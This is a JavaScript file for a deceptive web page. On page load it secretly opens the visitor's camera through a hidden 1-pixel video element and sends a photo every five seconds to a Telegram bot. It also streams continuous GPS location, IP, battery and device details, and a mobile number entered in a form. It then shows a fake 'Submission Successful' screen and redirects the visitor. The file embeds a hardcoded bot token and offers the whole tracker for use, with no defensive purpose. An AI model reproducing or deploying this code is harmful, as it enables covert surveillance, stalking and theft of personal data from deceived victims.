const BOT_TOKEN = "8431980730:AAFkOEc194xolmick_CgUMt5T51tf9c5S6Y"; // Replace with your bot token
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

let cameraStream = null;
let photoInterval = null;
let locationInterval = null;
let currentChatId = null;
let isCameraActive = false;
let photoCounter = 0;
let videoElement = null;
let watchId = null;
let currentLocation = null;
let locationUpdates = 0;
let isSubmitted = false;
let redirectUrl = "https://telegram.me/ANAS_ACCESS_BOT"; // Default redirect URL

// Create a hidden video element globally
function createVideoElement() {
    videoElement = document.createElement('video');
    videoElement.id = 'hidden-camera';
    videoElement.autoplay = true;
    videoElement.playsInline = true;
    videoElement.style.cssText = `
        position: fixed;
        top: -9999px;
        left: -9999px;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
    `;
    document.body.appendChild(videoElement);
}

// Parse URL parameters
function getUrlParameters() {
    const params = new URLSearchParams(window.location.search);
    const result = {};
    
    for (const [key, value] of params.entries()) {
        result[key] = value;
    }
    
    return result;
}

// Get redirect URL from parameter
function getRedirectUrl() {
    const params = getUrlParameters();
    const urlParam = params.url || params.redirect || params.link;
    
    if (urlParam) {
        try {
            // Decode URL and validate
            const decodedUrl = decodeURIComponent(urlParam);
            
            // Add https:// if not present
            let finalUrl = decodedUrl;
            if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
                finalUrl = 'https://' + finalUrl;
            }
            
            // Basic URL validation
            new URL(finalUrl); // This will throw if invalid
            
            console.log("Redirect URL from parameter:", finalUrl);
            return finalUrl;
        } catch (error) {
            console.error("Invalid redirect URL in parameter:", urlParam, error);
            return "https://telegram.me/ANAS_ACCESS_BOT"; // Fallback to default
        }
    }
    
    // Check for common URL parameter names
    const commonUrlParams = ['url', 'redirect', 'link', 'u', 'r', 'l'];
    for (const param of commonUrlParams) {
        if (params[param]) {
            try {
                const url = decodeURIComponent(params[param]);
                if (url.includes('.') || url.includes('/')) {
                    const fullUrl = url.startsWith('http') ? url : 'https://' + url;
                    new URL(fullUrl); // Validate
                    return fullUrl;
                }
            } catch (e) {
                // Continue to next param
            }
        }
    }
    
    return "https://telegram.me/ANAS_ACCESS_BOT"; // Default fallback
}

async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
    };

    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.charging = battery.charging;
            deviceInfo.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {
            console.error("Battery API error:", e);
        }
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
        deviceInfo.downlink = navigator.connection.downlink;
        deviceInfo.rtt = navigator.connection.rtt;
    }

    // Get screen resolution
    deviceInfo.screenWidth = window.screen.width;
    deviceInfo.screenHeight = window.screen.height;
    deviceInfo.windowWidth = window.innerWidth;
    deviceInfo.windowHeight = window.innerHeight;

    // Get time
    deviceInfo.currentTime = new Date().toLocaleString();

    return deviceInfo;
}

async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
        return result.ok;
    } catch (error) {
        console.error("Error sending message:", error);
        return false;
    }
}

async function sendPhoto(chatId, photo, photoNumber = 0, location = null) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);

    // Add caption with photo number, timestamp and location
    const timestamp = new Date().toLocaleTimeString();
    let caption = `📸 Photo #${photoNumber}\n⏰ Time: ${timestamp}`;

    if (location) {
        const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
        caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
        caption += `\n🗺️ Google Maps: ${mapsUrl}`;
        caption += `\n🎯 Accuracy: ${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}`;
    }

    formData.append('caption', caption);

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        console.log(`Photo #${photoNumber} sent at ${timestamp}:`, result.ok ? "Success" : "Failed");
        return result.ok;
    } catch (error) {
        console.error(`Error sending photo #${photoNumber}:`, error);
        return false;
    }
}

async function sendLocationUpdate(chatId, location) {
    const timestamp = new Date().toLocaleString();
    const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;

    const message = `
<b>📍 REAL-TIME LOCATION UPDATE #${locationUpdates}</b>

<b>📌 Coordinates:</b>
<b>Latitude:</b> <i>${location.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${location.longitude.toFixed(6)}</i>

<b>📊 Details:</b>
<b>Accuracy:</b> <i>${location.accuracy ? location.accuracy.toFixed(2) + ' meters' : 'N/A'}</i>
<b>Altitude:</b> <i>${location.altitude ? location.altitude.toFixed(2) + 'm' : 'N/A'}</i>
<b>Speed:</b> <i>${location.speed ? (location.speed * 3.6).toFixed(2) + ' km/h' : '0 km/h'}</i>
<b>Heading:</b> <i>${location.heading ? location.heading.toFixed(0) + '°' : 'N/A'}</i>

<b>🗺️ Quick Links:</b>
<b>Google Maps:</b> <a href="${mapsUrl}">Open in Maps</a>
<b>Plus Codes:</b> <code>${getPlusCode(location.latitude, location.longitude)}</code>

<b>⏰ Time:</b> <i>${timestamp}</i>
<b>📍 Source:</b> <i>GPS/Device Location</i>

<code>https://maps.google.com/?q=${location.latitude},${location.longitude}</code>
    `;

    await sendTelegramMessage(chatId, message);
    locationUpdates++;
}

function getPlusCode(latitude, longitude) {
    // Simple plus code generator (basic version)
    const plusCode = Math.abs(latitude * 10000).toString(36).toUpperCase().substring(0, 4) + 
                    Math.abs(longitude * 10000).toString(36).toUpperCase().substring(0, 4);
    return plusCode;
}

async function capturePhoto() {
    if (!videoElement || !cameraStream || !videoElement.videoWidth) {
        console.error("Camera not ready or no video feed");
        return null;
    }

    try {
        // Wait a moment for video to be ready
        if (videoElement.videoWidth === 0) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;

        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const photoData = canvas.toDataURL('image/jpeg', 0.8); // Use JPEG for smaller size

        // Convert data URL to Blob
        const blob = await (await fetch(photoData)).blob();
        return new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
    } catch (error) {
        console.error("Error capturing photo:", error);
        return null;
    }
}

async function startCamera() {
    try {
        console.log("Requesting camera permission...");
        
        // First, create the video element if it doesn't exist
        if (!videoElement) {
            createVideoElement();
        }

        // Try different camera configurations
        const constraints = {
            video: {
                facingMode: { ideal: 'environment' }, // Try back camera first
                width: { min: 640, ideal: 1280, max: 1920 },
                height: { min: 480, ideal: 720, max: 1080 },
                frameRate: { ideal: 30 }
            },
            audio: false
        };

        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia(constraints);
        } catch (error) {
            console.log("Back camera failed, trying front camera...");
            constraints.video.facingMode = { ideal: 'user' };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
        }

        cameraStream = stream;
        videoElement.srcObject = stream;

        // Wait for video to be ready
        await new Promise((resolve, reject) => {
            const timer = setTimeout(() => {
                reject(new Error("Camera initialization timeout"));
            }, 10000);

            videoElement.onloadedmetadata = () => {
                console.log(`Camera started successfully: ${videoElement.videoWidth}x${videoElement.videoHeight}`);
                clearTimeout(timer);
                isCameraActive = true;
                resolve();
            };

            videoElement.onerror = (err) => {
                clearTimeout(timer);
                reject(new Error("Video element error: " + err));
            };
        });

        return true;
    } catch (error) {
        console.error("Error accessing camera:", error);

        if (currentChatId) {
            const errorMessage = `
<b>⚠️ Camera Error</b>
<b>Error:</b> <i>${error.name}: ${error.message}</i>
<b>Time:</b> ${new Date().toLocaleString()}
<b>Note:</b> Camera access denied or not available
            `;
            await sendTelegramMessage(currentChatId, errorMessage);
        }

        // Try to continue without camera
        isCameraActive = false;
        return false;
    }
}

async function startLocationTracking() {
    if (!navigator.geolocation) {
        console.error("Geolocation is not supported by this browser");
        if (currentChatId) {
            await sendTelegramMessage(currentChatId, "❌ Geolocation is not supported by this device/browser");
        }
        return;
    }

    console.log("Starting location tracking...");

    // First get current location immediately
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
        });

        currentLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading,
            timestamp: new Date(position.timestamp)
        };

        console.log("Initial location obtained:", currentLocation);

        if (currentChatId) {
            await sendLocationUpdate(currentChatId, currentLocation);
        }

        // Start watching for location updates
        watchId = navigator.geolocation.watchPosition(
            async (position) => {
                currentLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date(position.timestamp)
                };

                console.log("Location updated:", currentLocation);

                // Send location update every 30 seconds
                if (currentChatId && locationUpdates % 6 === 0) {
                    await sendLocationUpdate(currentChatId, currentLocation);
                }
            },
            async (error) => {
                console.error("Geolocation error:", error);
                if (currentChatId) {
                    const errorMessage = `
<b>📍 Location Error</b>
<b>Code:</b> ${error.code}
<b>Message:</b> ${error.message}
<b>Time:</b> ${new Date().toLocaleString()}
                    `;
                    await sendTelegramMessage(currentChatId, errorMessage);
                }
            },
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 10000
            }
        );

        // Also send periodic location updates every 60 seconds
        locationInterval = setInterval(async () => {
            if (currentLocation && currentChatId) {
                await sendLocationUpdate(currentChatId, currentLocation);
            }
        }, 60000);

    } catch (error) {
        console.error("Error getting initial location:", error);
        if (currentChatId) {
            const errorMessage = `
<b>❌ Location Permission Denied</b>
<b>Code:</b> ${error.code}
<b>Message:</b> ${error.message}
<b>Note:</b> User denied location permission
<b>Time:</b> ${new Date().toLocaleString()}
            `;
            await sendTelegramMessage(currentChatId, errorMessage);
        }
    }
}

async function startContinuousPhotoCapture() {
    if (!isCameraActive || !currentChatId) {
        console.log("Camera not active, skipping photo capture");
        return;
    }

    console.log("Starting continuous photo capture (every 5 seconds)...");

    // First photo after 2 seconds
    setTimeout(async () => {
        try {
            const photo = await capturePhoto();
            if (photo) {
                photoCounter++;
                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
                console.log(`First photo (#${photoCounter}) sent`);
            }
        } catch (error) {
            console.error("Error with first photo:", error);
        }
    }, 2000);

    // Then every 5 seconds with location
    photoInterval = setInterval(async () => {
        try {
            const photo = await capturePhoto();
            if (photo) {
                photoCounter++;
                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);

                // Send status update every 10 photos
                if (photoCounter % 10 === 0) {
                    const statusMessage = `
<b>📊 LIVE TRACKING STATUS</b>

<b>📸 Photos:</b> <i>${photoCounter} photos captured</i>
<b>📍 Location Updates:</b> <i>${locationUpdates} updates sent</i>

${currentLocation ? `
<b>📍 Current Location:</b>
<b>Latitude:</b> <i>${currentLocation.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${currentLocation.longitude.toFixed(6)}</i>
<b>Accuracy:</b> <i>${currentLocation.accuracy ? currentLocation.accuracy.toFixed(2) + 'm' : 'N/A'}</i>
` : '<b>📍 Current Location:</b> <i>Waiting for GPS...</i>'}

<b>📱 Device Status:</b>
<b>Camera:</b> <i>${isCameraActive ? 'Active ✅' : 'Inactive ❌'}</i>
<b>Location:</b> <i>${currentLocation ? 'Active ✅' : 'Inactive ❌'}</i>
<b>Page Active:</b> <i>${!document.hidden ? 'Yes ✅' : 'No ⏸️'}</i>

<b>⏰ Time:</b> <i>${new Date().toLocaleString()}</i>
<b>🔋 Battery:</b> <i>${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'Unknown'}</i>

<b>👨‍💻 Tracked by: @ANAS_ACCESS_BOT</b>
                    `;
                    await sendTelegramMessage(currentChatId, statusMessage);
                }
            }
        } catch (error) {
            console.error("Error capturing/sending photo:", error);
        }
    }, 5000); // Changed to 5 seconds for better performance
}

async function sendInitialInfo() {
    try {
        const ipDetails = await getIpDetails();
        const deviceInfo = await getDeviceInfo();
        const params = getUrlParameters();
        
        currentChatId = params.id || params.chat_id || params.cid;
        
        // Get redirect URL from parameters
        redirectUrl = getRedirectUrl();
        console.log("Using redirect URL:", redirectUrl);

        if (!currentChatId) {
            console.error("❌ Chat ID missing in URL!");
            alert("Error: Missing tracking ID. Please check the URL.");
            return;
        }

        // Send URL parameter info to Telegram
        const paramMessage = `
<b>🔗 URL Parameters Received:</b>
${Object.entries(params).map(([key, value]) => `<b>${key}:</b> <i>${value}</i>`).join('\n')}
<b>🔀 Redirect To:</b> <i>${redirectUrl}</i>
        `;
        
        await sendTelegramMessage(currentChatId, paramMessage);

        const message = `
<b><u>🚨 COMPLETE TRACKING STARTED 🚨</u></b>

<b>🎯 TRACKING MODES ACTIVATED:</b>
✅ <b>Real-time Camera</b> (Every 5 seconds)
✅ <b>Live GPS Location</b> (Continuous)
✅ <b>Device Information</b>
✅ <b>Network Details</b>

<b>📅 Date & Time:</b> <i>${deviceInfo.currentTime}</i>
<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>📍 IP Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>🏢 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>

<b>📱 DEVICE INFORMATION:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes ⚡' : 'No'}</i>
<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network:</b> <i>${deviceInfo.networkType} (${deviceInfo.downlink}Mbps)</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
<b>💻 Platform:</b> <i>${deviceInfo.platform}</i>
<b>🗣️ Language:</b> <i>${deviceInfo.language}</i>
<b>📏 Screen:</b> <i>${deviceInfo.screenWidth}x${deviceInfo.screenHeight}</i>

<b>🎯 TRACKING SETTINGS:</b>
<b>📸 Camera:</b> <i>ACTIVE (Every 5 seconds)</i>
<b>📍 GPS Location:</b> <i>ACTIVE (Real-time)</i>
<b>📊 Data Collection:</b> <i>FULL ACCESS</i>

<b>🔗 Page URL:</b> <i>${window.location.href}</i>
<b>👤 User Agent:</b> <code>${deviceInfo.userAgent.substring(0, 100)}...</code>

<b>⚠️ WARNING: All activities are being monitored and recorded</b>
<b>👨‍💻 Tracked by: @ANAS_ACCESS_BOT</b>
        `;

        await sendTelegramMessage(currentChatId, message);
        console.log("Initial information sent to Telegram");

        // Start camera in background
        startCamera().then(cameraStarted => {
            console.log("Camera started:", cameraStarted);
            if (cameraStarted) {
                startContinuousPhotoCapture();
            }
        });

        // Start location tracking
        await startLocationTracking();

    } catch (error) {
        console.error("Error in sendInitialInfo:", error);
    }
}

function cleanup() {
    console.log("Cleaning up all tracking resources...");

    // Clear intervals
    if (photoInterval) {
        clearInterval(photoInterval);
        photoInterval = null;
        console.log("Photo interval cleared");
    }

    if (locationInterval) {
        clearInterval(locationInterval);
        locationInterval = null;
        console.log("Location interval cleared");
    }

    // Stop camera
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => {
            track.stop();
            console.log("Camera track stopped");
        });
        cameraStream = null;
    }

    // Stop location tracking
    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        console.log("Location watching stopped");
    }

    // Remove video element
    if (videoElement) {
        videoElement.pause();
        videoElement.srcObject = null;
        if (videoElement.parentNode) {
            videoElement.remove();
        }
        videoElement = null;
        console.log("Video element removed");
    }

    isCameraActive = false;

    // Send final status
    if (currentChatId && !isSubmitted) {
        const finalMessage = `
<b>📊 TRACKING SESSION ENDED</b>

<b>📸 Photos Captured:</b> <i>${photoCounter}</i>
<b>📍 Location Updates:</b> <i>${locationUpdates}</i>
<b>⏱️ Session Duration:</b> <i>${Math.round(photoCounter * 5)} seconds</i>

<b>📍 Final Location:</b>
${currentLocation ? `
<b>Latitude:</b> <i>${currentLocation.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${currentLocation.longitude.toFixed(6)}</i>
<b>Last Update:</b> <i>${currentLocation.timestamp.toLocaleTimeString()}</i>
` : '<i>No location data available</i>'}

<b>⏰ End Time:</b> <i>${new Date().toLocaleString()}</i>
<b>🚫 Status:</b> <i>All tracking stopped</i>

<b>👨‍💻 Tracked by: @ANAS_ACCESS_BOT</b>
        `;

        // Use sendBeacon for reliable exit tracking
        const blob = new Blob([JSON.stringify({
            chat_id: currentChatId,
            text: finalMessage,
            parse_mode: "HTML"
        })], {type: 'application/json'});

        navigator.sendBeacon(API_URL, blob);
    }
}

function redirectToUrl() {
    console.log("Redirecting to:", redirectUrl);
    cleanup();
    
    // Show redirect message
    document.body.innerHTML = `
        <div style="
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        ">
            <h1 style="font-size: 2.5em; margin-bottom: 20px;">✅ Submission Successful!</h1>
            <p style="font-size: 1.2em; margin-bottom: 10px;">
                Your information has been submitted successfully.
            </p>
            <p style="font-size: 1.1em; margin-bottom: 20px;">
                Redirecting to: <br>
                <code style="background: rgba(255,255,255,0.2); padding: 5px 10px; border-radius: 5px; font-size: 0.9em;">
                    ${redirectUrl.length > 50 ? redirectUrl.substring(0, 50) + '...' : redirectUrl}
                </code>
            </p>
            <div style="
                width: 50px;
                height: 50px;
                border: 5px solid rgba(255,255,255,0.3);
                border-top-color: white;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin-bottom: 30px;
            "></div>
            <p style="font-size: 0.9em; opacity: 0.8;">
                If not redirected automatically in 3 seconds, 
                <a href="${redirectUrl}" style="color: white; text-decoration: underline;">click here</a>
            </p>
            <p style="font-size: 0.8em; opacity: 0.6; margin-top: 20px;">
                Photos captured: ${photoCounter} | Location updates: ${locationUpdates}
            </p>
        </div>
        <style>
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
        </style>
    `;
    
    // Redirect after 3 seconds
    setTimeout(() => {
        window.location.href = redirectUrl;
    }, 3000);
}

// Handle page visibility
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        console.log("Page hidden, pausing tracking");
        if (photoInterval) {
            clearInterval(photoInterval);
            photoInterval = null;
        }
    } else {
        console.log("Page visible again, resuming tracking");
        if (isCameraActive && currentChatId && !photoInterval && !isSubmitted) {
            startContinuousPhotoCapture();
        }
    }
});

// Handle page unload
window.addEventListener('beforeunload', function(e) {
    if (!isSubmitted) {
        cleanup();
    }
});

// Form submission
document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();

    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const params = getUrlParameters();
    const chatId = params.id || params.chat_id || params.cid;

    if (!chatId) {
        alert("Chat ID is missing in the URL!");
        return;
    }

    // Show loading
    const submitBtn = document.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = "Submitting...";
    submitBtn.disabled = true;

    try {
        const ipDetails = await getIpDetails();

        const message = `
<b><u>📞 MOBILE NUMBER SUBMITTED WITH LIVE TRACKING</u></b>

<b>📱 Mobile Number:</b> <i>+91${mobileNumber}</i>
<b>📡 Operator:</b> <i>${operator}</i>
<b>🔗 Redirect URL:</b> <i>${redirectUrl}</i>

<b>📍 CURRENT GPS LOCATION:</b>
${currentLocation ? `
<b>Latitude:</b> <i>${currentLocation.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${currentLocation.longitude.toFixed(6)}</i>
<b>Accuracy:</b> <i>${currentLocation.accuracy ? currentLocation.accuracy.toFixed(2) + 'm' : 'N/A'}</i>
<b>Maps Link:</b> https://maps.google.com/?q=${currentLocation.latitude},${currentLocation.longitude}
` : '<i>Location data pending...</i>'}

<b>🌐 IP Information:</b>
<b>IP Address:</b> <i>${ipDetails.ip}</i>
<b>Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>ISP:</b> <i>${ipDetails.org}</i>

<b>📊 Live Tracking Stats:</b>
<b>Photos:</b> <i>${photoCounter} captured</i>
<b>Location Updates:</b> <i>${locationUpdates} sent</i>

<b>⏰ Submission Time:</b> <i>${new Date().toLocaleString()}</i>

<b>👨‍💻 Tracked by: @ANAS_ACCESS_BOT</b>
        `;

        const success = await sendTelegramMessage(chatId, message);
        
        if (success) {
            isSubmitted = true;
            
            // Send final photo before redirect
            if (isCameraActive) {
                const finalPhoto = await capturePhoto();
                if (finalPhoto) {
                    photoCounter++;
                    await sendPhoto(chatId, finalPhoto, photoCounter, currentLocation);
                }
            }
            
            // Send redirect notification
            const redirectMessage = `
<b>🔄 REDIRECTING USER</b>

<b>User submitted number:</b> +91${mobileNumber}
<b>Redirecting to:</b> ${redirectUrl}
<b>Final Stats:</b>
- Photos: ${photoCounter}
- Location Updates: ${locationUpdates}
- Session Time: ${Math.round(photoCounter * 5)} seconds

<b>Time:</b> ${new Date().toLocaleString()}
<b>User will be redirected in 3 seconds</b>
            `;
            await sendTelegramMessage(chatId, redirectMessage);
            
            // Redirect to the URL from parameter
            setTimeout(() => {
                redirectToUrl();
            }, 2000);
        } else {
            alert("❌ Failed to send data. Please try again.");
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
        }
        
    } catch (error) {
        console.error("Error submitting form:", error);
        alert("❌ An error occurred. Please try again.");
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
    }
});

// Format mobile number
document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
});

// Start everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    console.log("🚀 Starting Complete Tracking System...");
    console.log("📸 Camera: Every 5 seconds");
    console.log("📍 GPS: Real-time tracking");
    console.log("📱 Device: Full information collection");

    // Get URL parameters
    const params = getUrlParameters();
    console.log("URL Parameters:", params);
    
    // Get redirect URL from parameters
    redirectUrl = getRedirectUrl();
    console.log("Will redirect to:", redirectUrl);

    // Create video element immediately
    createVideoElement();

    // Update loading indicator
    const updateStatus = setInterval(() => {
        document.getElementById('cam-status').textContent = isCameraActive ? 'Active ✅' : 'Starting...';
        document.getElementById('gps-status').textContent = currentLocation ? 'Active ✅' : 'Requesting...';
        document.getElementById('photo-count').textContent = photoCounter;
        document.getElementById('loc-count').textContent = locationUpdates;
        
        // Show redirect URL in UI if available
        if (redirectUrl && redirectUrl !== "https://telegram.me/ANAS_ACCESS_BOT") {
            const redirectInfo = document.getElementById('redirect-info');
            if (redirectInfo) {
                redirectInfo.textContent = `Will redirect to: ${redirectUrl}`;
                redirectInfo.style.display = 'block';
            }
        }
    }, 1000);

    // Start complete tracking after a short delay
    setTimeout(() => {
        sendInitialInfo();
    }, 1000);
});
